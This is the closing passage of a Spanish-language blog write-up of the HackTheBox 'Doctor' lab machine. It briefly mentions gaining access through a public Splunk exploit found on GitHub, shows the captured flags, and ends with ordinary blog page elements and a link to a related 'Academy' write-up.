<p>Listos, tamos dentro, bastante sencillo, aunque antes de encontrar este exploit, estaba un toque confundido usando otras herramientas, pero bueno, una búsqueda siempre confiable con Google: <code>exploit splunk github</code>.</p>

<p>Veamos las flags:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278flags.png" alt="278flags" /></p>

<p>…</p>

<p>Máquina un poco traviesa al inicio, bastante sencilla la escalada, quizás para compensar el mismo inicio.</p>

<p>Gracias por pasarte y a seguir rompiendo todo (:</p>

</div>

<!-- Rating -->


<!-- Author Box if enabled from _config.yml -->
<!-- Author Box -->




<!-- Comments if not disabled with comments: false -->
<!-- Comments
================================================== -->
 
<div class="comments">
    <button class="btn btn-dark show-comments">Comentarios</button>         
    <div id="comments">  
        <h4 class="mb-4">Comments</h4>                 
            <section class="disqus">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'demowebsite'; 
        var disqus_developer = 0;
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>
     
    <div class="clearfix"></div>              
    </div>    
</div>       


<!-- Share -->
<div class="share">
    <p>
        Vacios
    </p>
    <ul>
        <li class="ml-1 mr-1">
            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Doctor&url=http://localhost:4000/htb/doctor" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                <i class="fab fa-twitter"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fas fa-cube"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fab fa-github"></i>
            </a>
        </li>

    </ul>
</div>


<!-- Related Post -->
<!-- Related Posts
================================================== -->
<div class=" related-posts ">  

    
    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
    
    
    <div class="d-flex justify-content-center align-items-center">

    <!-- Tags -->  
    
                    
    <a class="smoothscroll badge badge-primary" href="/tags#SSTI">SSTI</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#logs">logs</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#splunk">splunk</a>               
    
    
    <!-- Categories -->
    
    
    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
    

    </div>

    
    
    
    <div class="blog-grid-container">
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/academy">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297banner.png" alt="HackTheBox - Academy"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/academy">HackTheBox - Academy</a>
                
            </h2>
            <h4 class="card-text">Máquina Linux nivel fácil. Pensaremos en bases de datos (eh?), deserializaremos mentes :o, jugaremos con archivos ‘log’ y romperemos un binario que nos dará en este caso dependencia de ser...</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">27 Feb 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        </div>        
</div>

<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
https://search.google.com/structured-data/testing-tool/u/0/
================================================== -->

    </div>

    
    <!-- Newsletter
    ================================================== -->
    <div class="newsletter text-center">
        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
        <p></p>
    </div>
    
    
</div>

<!-- Begin Footer
================================================== -->
<footer class="footer">
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-sm-12 text-center text-lg-left">
                Copyright © 2022 Sh0x blog 
            </div>
            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
            </div>
        </div>
    </div>
</footer>
<!-- End Footer
================================================== -->

</div> <!-- /.site-content -->

<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
================================================== -->

<script src="/assets/js/prism.js"></script>

<script src="/assets/js/theme.js"></script>




<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>


</body>
</html>
